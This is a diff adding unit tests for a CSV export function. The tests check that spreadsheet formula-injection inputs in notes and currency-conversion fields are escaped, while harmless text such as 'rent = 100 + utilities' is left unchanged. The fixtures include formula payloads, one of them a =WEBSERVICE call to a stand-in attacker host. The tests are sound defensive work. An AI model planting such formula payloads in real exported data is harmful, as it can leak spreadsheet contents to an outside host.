@@ -103,6 +103,61 @@ describe("csvExport", () => {
     expect(line!.endsWith("you,true")).toBe(true);
   });
 
+  it.each(["=1+1", "+SUM(A1:A2)", "-2+3", "@SUM(A1:A2)"])(
+    "neutralizes spreadsheet formula note %j",
+    (note) => {
+      const csv = entriesToCsv([
+        { payload: { ...sampleRow, note }, created_by_me: true, edited: false },
+      ]);
+      expect(csv.split("\n")[1].split(",")[10]).toBe(`'${note}`);
+    },
+  );
+
+  it.each(["  =1+1", "\t=1+1", "\r=1+1", "\ufeff@SUM(A1:A2)"])(
+    "neutralizes formula prefixes hidden behind whitespace %j",
+    (note) => {
+      const csv = entriesToCsv([
+        { payload: { ...sampleRow, note }, created_by_me: true, edited: false },
+      ]);
+      expect(csv).toContain(`'${note}`);
+    },
+  );
+
+  it("does not alter benign arithmetic characters in the middle of text", () => {
+    const csv = entriesToCsv([
+      {
+        payload: { ...sampleRow, note: "rent = 100 + utilities" },
+        created_by_me: true,
+        edited: false,
+      },
+    ]);
+    expect(csv).toContain("rent = 100 + utilities");
+    expect(csv).not.toContain("'rent = 100 + utilities");
+  });
+
+  it("neutralizes formula text in a non-note user-controlled column", () => {
+    const csv = entriesToCsv([
+      {
+        payload: {
+          ...sampleRow,
+          convert: {
+            from_currency: "EUR",
+            from_amount_minor: 1000,
+            to_currency: "USD",
+            to_amount_minor: 1250,
+            rate: 1.25,
+            rate_source: "=WEBSERVICE(\"https://attacker.invalid\")",
+            rate_fetched_at: sampleRow.ts,
+          },
+        },
+        created_by_me: true,
+        edited: false,
+      },
+    ]);
+    expect(csv).toContain("'=WEBSERVICE");
+    expect(csv).not.toContain(",=WEBSERVICE");
+  });
+
   it("writes empty cells for non-fee, non-convert rows", () => {
     const csv = entriesToCsv([
       { payload: sampleRow, created_by_me: false, edited: false },
